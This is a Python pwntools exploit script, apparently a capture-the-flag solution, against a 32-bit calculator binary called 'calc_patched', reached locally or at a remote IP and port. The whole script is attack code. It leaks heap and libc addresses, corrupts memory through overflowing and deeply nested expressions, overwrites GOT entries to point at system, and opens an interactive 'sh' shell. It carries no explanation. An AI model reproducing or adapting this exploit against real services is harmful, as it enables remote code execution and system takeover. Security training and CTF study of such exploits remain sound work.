#!/usr/bin/env python3
from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64

if args.LOCAL:
    io=process('./calc_patched')
    if args.GDB:
        cmd="""
        b* 0x0804A170
        """
        gdb.attach(io, cmd)
elif args.REMOTE:
    io = remote('3.125.9.27', 20000)
else:
    io = remote('0', 20000)

elf = ELF('./calc_patched')
libc = ELF('./libc.so.6')

def calc(exp):
    io.sendlineafter(b'INPUT >>', exp)
    sleep(0.1)

def i2s(addr):
    return str(u32(p32(addr))).encode()
    
ptr = 0x804d4a4


pause()
# leak heap
calc(b'99999999999*0')
io.sendafter(b'>> ', p32(0))
io.recvuntil(b'P ')
heap = int(io.recv(9), 16) - 0x530  
print(hex(heap))

# trigger
calc(b'('*255+b'1+1'+b')'*255)
# calc(b'('*255+b'1+1'+b')'*255)

# aaw ?
free_got = 0x804d014
calc(b'99999999999*0')

pl = p32(ptr-0x8)+p32(0x0)*2+p32(0x20)+p32(0x804d014)
io.sendafter(b'>> ', pl)


# pause()
## trigger
calc(b'('*6+i2s(0x0804A170)+b'+$'+b')'*6)

## overwrite_got
start = 0x8048740
suss = 0x0804ADB0
main = 0x0804AFA2
ret = 0x0804859a
unexpected = 0x8048C70

pl = p32(u32(b"sh\0\0")) + \
    p32(elf.plt.strdup+6) + \
    p32(elf.plt.memcpy+6) + \
    p32(0x0804B0B7) +  \
    p32(elf.plt.perror+6) + \
    p32(elf.plt.malloc+6) + \
    p32(elf.plt.puts+6) + \
    p32(0x0804A170)
    
io.send(pl)

io.recv(4)
libc.address = u32(io.recv(4)) - 0x505b6
print(hex(libc.address))
pl = p32(u32(b"sh\0\0")) + \
    p32(elf.plt.strdup+6) + \
    p32(elf.plt.memcpy+6) + \
    p32(elf.plt.puts) + \
    p32(elf.plt.perror+6) + \
    p32(elf.plt.malloc+6) + \
    p32(libc.sym.system) 
    
io.send(pl)
io.interactive()   